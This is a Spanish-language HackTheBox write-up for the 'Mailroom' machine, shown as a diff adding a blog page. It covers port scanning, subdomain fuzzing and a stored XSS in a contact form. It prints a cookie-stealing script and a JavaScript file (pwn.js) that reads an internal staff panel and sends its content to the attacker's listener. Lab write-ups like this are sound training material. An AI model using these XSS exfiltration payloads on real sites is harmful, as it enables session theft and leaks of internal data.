@@ -1,0 +1,1206 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Mailroom (hard) | l1nvx - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Mailroom (hard)" />
+<meta name="author" content="l1nvx" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Enumeracion Uso esta funcion para aumentar la la rapidez de enumeracion. λ ubuntu-pc Busqueda → which scan scan () { target $1 sudo nmap --min-rate 5000 -p- --privileged -sS -Pn -n -v $1 -oN nmap/all-tcp-ports.txt ports=$(cat nmap/all-tcp-ports.txt | grep -oP &quot;\d+/tcp&quot; | cut -d / -f 1 | tr &quot;\n&quot; &quot;,&quot; |sed &#39;s/,$//g&#39;) sudo nmap -T4 -p$ports -A -Pn -n -v $1 -oN nmap/all-tcp-versions.txt }" />
+<meta property="og:description" content="Enumeracion Uso esta funcion para aumentar la la rapidez de enumeracion. λ ubuntu-pc Busqueda → which scan scan () { target $1 sudo nmap --min-rate 5000 -p- --privileged -sS -Pn -n -v $1 -oN nmap/all-tcp-ports.txt ports=$(cat nmap/all-tcp-ports.txt | grep -oP &quot;\d+/tcp&quot; | cut -d / -f 1 | tr &quot;\n&quot; &quot;,&quot; |sed &#39;s/,$//g&#39;) sudo nmap -T4 -p$ports -A -Pn -n -v $1 -oN nmap/all-tcp-versions.txt }" />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/hard/2023/08/18/Mailroom.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/hard/2023/08/18/Mailroom.html" />
+<meta property="og:site_name" content="l1nvx - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-08-18T00:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Mailroom (hard)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"l1nvx"},"dateModified":"2023-08-18T00:00:00-04:00","datePublished":"2023-08-18T00:00:00-04:00","description":"Enumeracion Uso esta funcion para aumentar la la rapidez de enumeracion. λ ubuntu-pc Busqueda → which scan scan () { target $1 sudo nmap --min-rate 5000 -p- --privileged -sS -Pn -n -v $1 -oN nmap/all-tcp-ports.txt ports=$(cat nmap/all-tcp-ports.txt | grep -oP &quot;\\d+/tcp&quot; | cut -d / -f 1 | tr &quot;\\n&quot; &quot;,&quot; |sed &#39;s/,$//g&#39;) sudo nmap -T4 -p$ports -A -Pn -n -v $1 -oN nmap/all-tcp-versions.txt }","headline":"HackTheBox - Mailroom (hard)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/hard/2023/08/18/Mailroom.html"},"url":"http://localhost:4000/hackthebox/machines/hard/2023/08/18/Mailroom.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="l1nvx - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">l1nvx - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Mailroom (hard)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2023-08-18T00:00:00-04:00" itemprop="datePublished">
+        Aug 18, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h3 id="enumeracion"><strong>Enumeracion</strong></h3>
+<p>Uso esta funcion para aumentar la la rapidez de enumeracion.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">λ ubuntu-pc Busqueda → which scan
+scan <span class="o">()</span> <span class="o">{</span>
+        target <span class="nv">$1</span>
+        <span class="nb">sudo </span>nmap <span class="nt">--min-rate</span> 5000 <span class="nt">-p-</span> <span class="nt">--privileged</span> <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nv">$1</span> <span class="nt">-oN</span> nmap/all-tcp-ports.txt
+        <span class="nv">ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>nmap/all-tcp-ports.txt | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\d</span><span class="s2">+/tcp"</span> | <span class="nb">cut</span> <span class="nt">-d</span> / <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>  <span class="s2">","</span> |sed <span class="s1">'s/,$//g'</span><span class="si">)</span>
+        <span class="nb">sudo </span>nmap <span class="nt">-T4</span> <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-A</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nv">$1</span> <span class="nt">-oN</span> nmap/all-tcp-versions.txt
+<span class="o">}</span></code></pre></figure>
+
+<p>Nmap encuentra 2 puertos abiertos.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.54 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-favicon: Unknown favicon MD5: 846CD0D87EB3766F77831902466D753F
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: The Mail Room</code></pre></figure>
+
+<p>Visitando la pagina, esta luce de esta forma.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/web.png" alt="web" /></p>
+
+<p>Algunos enlaces mandan a:</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">http://10.10.11.209/about.php
+http://10.10.11.209/contact.php
+http://10.10.11.209/index.php
+http://10.10.11.209/services.php</code></pre></figure>
+
+<p>El que llama mas la atencion es el formulario de contacto en <code class="language-plaintext highlighter-rouge">/contact.php</code>.</p>
+
+<p>Hay una IA que ve nuestro mensaje.</p>
+
+<p>Esto huele a XSS.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/contact.png" alt="contact" /></p>
+
+<p>Luego de enviar el formulario, aparece un link de nuestro mensaje.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/contact-sended.png" alt="contact-sended" /></p>
+
+<p>El link se ve asi.</p>
+
+<p>Donde “hola, esto es una prueba” es lo que envie en el campo message, donde “l1nvx@l1nvx” es lo que envie en el campo email y “probando” es lo que envie en el campo title.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/contact-message.png" alt="contact-message" /></p>
+
+<h3 id="xss"><strong>XSS</strong></h3>
+
+<p>Enviando <code class="language-plaintext highlighter-rouge">&lt;script&gt;alert(1);&lt;/script&gt;</code> en el campo message, obtenemos el alert.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/alert.png" alt="alert" /></p>
+
+<p>En este punto tratemos de robar alguna cookie, existe la posibilidad que esa IA tenga alguna una cookie de sesion la cual le permite acceder a alguna funcionalidad de la web para ver nuestro mensaje, que nosotros no tenemos.</p>
+
+<p>Utilizo <code class="language-plaintext highlighter-rouge">&lt;script&gt;document.location="http://10.10.14.189:8000/?c=" + document.cookie&lt;/script&gt;</code>.</p>
+
+<p>Utilizar netcat revela algunos headers interesantes como el referer.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → nc <span class="nt">-lnvp</span> 8000
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::8000
+Ncat: Listening on 0.0.0.0:8000
+Ncat: Connection from 10.10.11.209.
+Ncat: Connection from 10.10.11.209:33036.
+GET /?c<span class="o">=</span> HTTP/1.1
+Host: 10.10.14.189:8000
+User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:102.0<span class="o">)</span> Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/avif,image/webp,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
+Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+Accept-Encoding: <span class="nb">gzip</span>, deflate
+Referer: http://127.0.0.1/
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1</code></pre></figure>
+
+<p>No hay cookies.</p>
+
+<p>En este punto el XSS no nos sirve de mucho, fuzzeare archivos-directorios que existan en la web.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → feroxbuster <span class="nt">-u</span> http://10.10.11.209 <span class="nt">-w</span> ~/SecLists/Discovery/Web-Content/common.txt
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
+|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
+by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.10.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.209
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /home/l1nvx/SecLists/Discovery/Web-Content/common.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
+ 🦡  User-Agent            │ Random
+ 🔎  Extract Links         │ <span class="nb">true</span>
+ 🏁  HTTP methods          │ <span class="o">[</span>GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
+403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
+200      GET       86l      271w     4317c http://10.10.11.209/contact.php
+200      GET     1345l     6662w    64933c http://10.10.11.209/font/bootstrap-icons.css
+200      GET      320l     1728w   209928c http://10.10.11.209/assets/favicon.ico
+200      GET      128l      534w     7748c http://10.10.11.209/index.php
+200      GET       75l      321w     4336c http://10.10.11.209/services.php
+200      GET      118l      394w     6891c http://10.10.11.209/about.php
+200      GET    11300l    21361w   206710c http://10.10.11.209/css/styles.css
+200      GET        7l     1031w    78135c http://10.10.11.209/js/bootstrap.bundle.min.js
+200      GET      128l      534w     7748c http://10.10.11.209/
+301      GET        9l       28w      313c http://10.10.11.209/assets <span class="o">=&gt;</span> http://10.10.11.209/assets/
+301      GET        9l       28w      310c http://10.10.11.209/css <span class="o">=&gt;</span> http://10.10.11.209/css/
+301      GET        9l       28w      311c http://10.10.11.209/font <span class="o">=&gt;</span> http://10.10.11.209/font/
+301      GET        9l       28w      316c http://10.10.11.209/inquiries <span class="o">=&gt;</span> http://10.10.11.209/inquiries/
+301      GET        9l       28w      317c http://10.10.11.209/javascript <span class="o">=&gt;</span> http://10.10.11.209/javascript/
+301      GET        9l       28w      309c http://10.10.11.209/js <span class="o">=&gt;</span> http://10.10.11.209/js/</code></pre></figure>
+
+<p>Nada interesante, fuzzeare subdominios, el problema esque no conozco el dominio de la web</p>
+
+<p>En apache hay una forma para obtenerlo</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → curl <span class="nt">--header</span> <span class="s2">"Host: *"</span> <span class="nt">--url</span> http://10.10.11.209
+&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
+&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
+&lt;title&gt;400 Bad Request&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Bad Request&lt;/h1&gt;
+&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;
+&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span> Server at mailroom.htb Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</code></pre></figure>
+
+<p>Nos lekea el dominio <code class="language-plaintext highlighter-rouge">mailroom.htb</code>.</p>
+
+<p>Tambien estaba en la web.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/domain.png" alt="domain" /></p>
+
+<p>Utilizo ffuf para esto.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → ffuf <span class="nt">-u</span> http://10.10.11.209 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.mailroom.htb"</span> <span class="nt">-w</span> ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">-fs</span> 7748
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.5.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.209
+ :: Wordlist         : FUZZ: /home/l1nvx/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : User-Agent: Mozilla/5.0 (Linux; Android 5.1; iris 600 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36
+ :: Header           : Host: FUZZ.mailroom.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 7748
+________________________________________________
+
+[Status: 200, Size: 13201, Words: 1009, Lines: 268, Duration: 523ms]
+| URL | http://10.10.11.209
+    * FUZZ: git</span></code></pre></figure>
+
+<p>Encontramos <code class="language-plaintext highlighter-rouge">git.mailroom.htb</code>, lo añadimos al nuestro /etc/hosts.</p>
+
+<h3 id="gitmailroomhtb"><strong>git.mailroom.htb</strong></h3>
+
+<p>Visitamos el subdominio y se esta ejecutando gitea.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/gitea.png" alt="gitea" /></p>
+
+<p>Encontramos un repositorio y un usuario.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/repo.png" alt="repo" /></p>
+
+<p>Es un proyecto web.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/repo-files.png" alt="repo-files" /></p>
+
+<p>Revisando los commits encontramos un subdominio nuevo.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/commit.png" alt="domain" /></p>
+
+<h4 id="staff-review-panelmailroomhtb"><strong>staff-review-panel.mailroom.htb</strong></h4>
+
+<p>Despues de añadir el subdominio al /etc/hosts, lo visitamos y nos responde con <code class="language-plaintext highlighter-rouge">Forbidden</code>.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/forbidden.png" alt="forbidden" /></p>
+
+<p>Recordando el XSS veamos si nos responde el header <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> que utiliza <code class="language-plaintext highlighter-rouge">CORS</code> cuando un navegador envia una peticion desde un dominio o subdominio diferente al solicitado.</p>
+
+<p><em>Cuando un sitio intenta obtener contenido de otro sitio, el encabezado Access-Control-Allow-Origin especifica dónde se puede acceder al contenido de una página</em></p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → curl <span class="nt">--url</span> http://staff-review-panel.mailroom.htb <span class="nt">--header</span> <span class="s2">"Origin: http://127.0.0.1"</span> <span class="nt">--header</span> <span class="s2">"Referer: http://127.0.0.1"</span> <span class="nt">--head</span>
+HTTP/1.1 403 Forbidden
+Date: Mon, 14 Aug 2023 01:03:58 GMT
+Server: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1</code></pre></figure>
+
+<p>De todas formas no nos devuelve nada interesante, lo cual podemos sospechar que hay un control de acceso que comprueba la ip de origen (enviemos lo que enviemos nos devolvera Forbidden porque nuestra ip no esta permitida)</p>
+
+<h4 id="comprobacion-de-csp"><strong>Comprobacion de <code class="language-plaintext highlighter-rouge">CSP</code></strong>.</h4>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → curl <span class="nt">--url</span> http://10.10.11.209 <span class="nt">--head</span>
+HTTP/1.1 200 OK
+Date: Mon, 14 Aug 2023 00:40:22 GMT
+Server: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
+X-Powered-By: PHP/7.4.33
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8</code></pre></figure>
+
+<p><em>CSP</em>: <em>Enumera y describe rutas y fuentes, desde las cuales el navegador puede cargar recursos de manera segura.</em></p>
+
+<p>No esta definido el <code class="language-plaintext highlighter-rouge">Content-Security-policy</code> header, osea podemos ejecutar codigo javascript arbitrario utilizando el XSS.</p>
+<h3 id="csrf---staff-review-panelmailroomhtb"><strong>CSRF - staff-review-panel.mailroom.htb</strong></h3>
+
+<p>Llamemos a un script de nuestro servidor.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;script src="http://10.10.14.189:8000/enum/pwn.js"&gt;&lt;/script&gt;</code></p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → curl <span class="nt">--silent</span> <span class="nt">--request</span> POST <span class="nt">--data-raw</span> <span class="s2">"email=l1nvx%40l1nvx&amp;title=l&amp;message=%3Cscript+src%3D%22http%3A%2F%2F10.10.14.189%3A8000%2Fenum%2Fpwn.js%22%3E%3C%2Fscript%3E"</span> <span class="nt">--url</span> <span class="s2">"http://10.10.11.209/contact.php"</span> 1&gt;/dev/null</code></pre></figure>
+
+<p>Peticion en nuestro servidor.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → server
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 20:47:49] code 404, message File not found
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 20:47:49] <span class="s2">"GET /enum/pwn.js HTTP/1.1"</span> 404 -</code></pre></figure>
+
+<p>Veamos si podemos obtener el contenido de <code class="language-plaintext highlighter-rouge">staff-review-panel.mailroom.htb</code>.</p>
+
+<p>No pude hacer funcionar <code class="language-plaintext highlighter-rouge">fetch</code>, por alguna razon no funciona, utilizare XMLHttpRequest.</p>
+
+<p><code class="language-plaintext highlighter-rouge">pwn.js</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">const</span> <span class="nx">l1nvx</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://10.10.14.189:8000</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://staff-review-panel.mailroom.htb</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="kd">function</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">DONE</span><span class="p">)</span> <span class="p">{</span>
+                <span class="c1">// Enviar el contenido</span>
+                <span class="kd">const</span> <span class="nx">req_</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+                <span class="nx">req_</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="s2">`</span><span class="p">${</span><span class="nx">l1nvx</span><span class="p">}</span><span class="s2">/?data=</span><span class="p">${</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)}</span><span class="s2">`</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+                <span class="nx">req_</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
+    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Enviar error</span>
+        <span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="s2">`</span><span class="p">${</span><span class="nx">l1nvx</span><span class="p">}</span><span class="s2">/?error=</span><span class="p">${</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">error</span><span class="p">)}</span><span class="s2">`</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nf">main</span><span class="p">();</span></code></pre></figure>
+
+<p>Obtenemos el contenido.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">10.10.11.209 - - <span class="o">[</span>13/Aug/2023 20:57:05] <span class="s2">"GET /?data=%0A%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%0A%3Chead%3E%0A%20%20%3Cmeta%20charset%3D%22utf-8%22%20%2F%3E%0A%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%2C%20shrink-to-fit%3Dno%22%20%2F%3E%0A%20%20%3Cmeta%20name%3D%22description%22%20content%3D%22%22%20%2F%3E%0A%20%20%3Cmeta%20name%3D%22author%22%20content%3D%22%22%20%2F%3E%0A%20%20%3Ctitle%3EInquiry%20Review%20Panel%3C%2Ftitle%3E%0A%20%20%3C!--%20Favicon--%3E%0A%20%20%3Clink%20rel%3D%22icon%22%20type%3D%22image%2Fx-icon%22%20href%3D%22assets%2Ffavicon.ico%22%20%2F%3E%0A%20%20%3C!--%20Bootstrap%20icons--%3E%0A%20%20%3Clink%20href%3D%22font%2Fbootstrap-icons.css%22%20rel%3D%22stylesheet%22%20%2F%3E%0A%20%20%3C!--%20Core%20theme%20CSS%20(includes%20Bootstrap)--%3E%0A%20%20%3Clink%20href%3D%22css%2Fstyles.css%22%20rel%3D%22stylesheet%22%20%2F%3E%0A%3C%2Fhead%3E%0A%0A%3Cbody%3E%0A%20%20%3Cdiv%20class%3D%22wrapper%20fadeInDown%22%3E%0A%20%20%20%20%3Cdiv%20id%3D%22formContent%22%3E%0A%0A%20%20%20%20%20%20%3C!--%20Login%20Form%20--%3E%0A%20%20%20%20%20%20%3Cform%20id%3D%27login-form%27%20method%3D%22POST%22%3E%0A%20%20%20%20%20%20%20%20%3Ch2%3EPanel%20Login%3C%2Fh2%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3D%22text%22%20id%3D%22email%22%20class%3D%22fadeIn%20second%22%20name%3D%22email%22%20placeholder%3D%22Email%22%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3D%22password%22%20id%3D%22password%22%20class%3D%22fadeIn%20third%22%20name%3D%22password%22%20placeholder%3D%22Password%22%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22submit%22%20class%3D%22fadeIn%20fourth%22%20value%3D%22Log%20In%22%3E%0A%20%20%20%20%20%20%20%20%3Cp%20hidden%20id%3D%22message%22%20style%3D%22color%3A%20%238F8F8F%22%3EOnly%20show%20this%20line%20if%20response%20-%20edit%20code%3C%2Fp%3E%0A%20%20%20%20%20%20%3C%2Fform%3E%0A%0A%20%20%20%20%20%20%3C!--%20Remind%20Passowrd%20--%3E%0A%20%20%20%20%20%20%3Cdiv%20id%3D%22formFooter%22%3E%0A%20%20%20%20%20%20%20%20%3Ca%20class%3D%22underlineHover%22%20href%3D%22register.html%22%3ECreate%20an%20account%3C%2Fa%3E%0A%20%20%20%20%20%20%3C%2Fdiv%3E%0A%0A%20%20%20%20%3C%2Fdiv%3E%0A%20%20%3C%2Fdiv%3E%0A%0A%20%20%3C!--%20Bootstrap%20core%20JS--%3E%0A%20%20%3Cscript%20src%3D%22js%2Fbootstrap.bundle.min.js%22%3E%3C%2Fscript%3E%0A%0A%20%20%3C!--%20Login%20Form--%3E%0A%20%20%3Cscript%3E%0A%20%20%20%20%2F%2F%20Get%20the%20form%20element%0A%20%20%20%20const%20form%20%3D%20document.getElementById(%27login-form%27)%3B%0A%0A%20%20%20%20%2F%2F%20Add%20a%20submit%20event%20listener%20to%20the%20form%0A%20%20%20%20form.addEventListener(%27submit%27%2C%20event%20%3D%3E%20%7B%0A%20%20%20%20%20%20%2F%2F%20Prevent%20the%20default%20form%20submission%0A%20%20%20%20%20%20event.preventDefault()%3B%0A%0A%20%20%20%20%20%20%2F%2F%20Send%20a%20POST%20request%20to%20the%20login.php%20script%0A%20%20%20%20%20%20fetch(%27%2Fauth.php%27%2C%20%7B%0A%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20body%3A%20new%20URLSearchParams(new%20FormData(form))%2C%0A%20%20%20%20%20%20%20%20headers%3A%20%7B%20%27Content-Type%27%3A%20%27application%2Fx-www-form-urlencoded%27%20%7D%0A%20%20%20%20%20%20%7D).then(response%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20return%20response.json()%3B%0A%0A%20%20%20%20%20%20%7D).then(data%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%2F%2F%20Display%20the%20name%20and%20message%20in%20the%20page%0A%20%20%20%20%20%20%20%20document.getElementById(%27message%27).textContent%20%3D%20data.message%3B%0A%20%20%20%20%20%20%20%20document.getElementById(%27password%27).value%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%20%20document.getElementById(%27message%27).removeAttribute(%22hidden%22)%3B%0A%20%20%20%20%20%20%7D).catch(error%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%2F%2F%20Display%20an%20error%20message%0A%20%20%20%20%20%20%20%20%2F%2Falert(%27Error%3A%20%27%20%2B%20error)%3B%0A%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D)%3B%0A%20%20%3C%2Fscript%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E HTTP/1.1"</span> 200 -</code></pre></figure>
+
+<p>Al decodificar y verlo desde firefox.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/login.png" alt="login" /></p>
+
+<p>En este punto podemos entonces realizar peticiones a ese subdominio.</p>
+
+<p>Volviendo al repositorio donde encontramos el subdominio confirmamos que el codigo corresponde al archivo <code class="language-plaintext highlighter-rouge">index.php</code>, entonces confirmamos que el repositorio es el codigo del subdominio <code class="language-plaintext highlighter-rouge">staff-review-panel.mailroom.htb</code>.</p>
+
+<h3 id="analisis-de-codigo"><strong>Analisis de codigo</strong></h3>
+
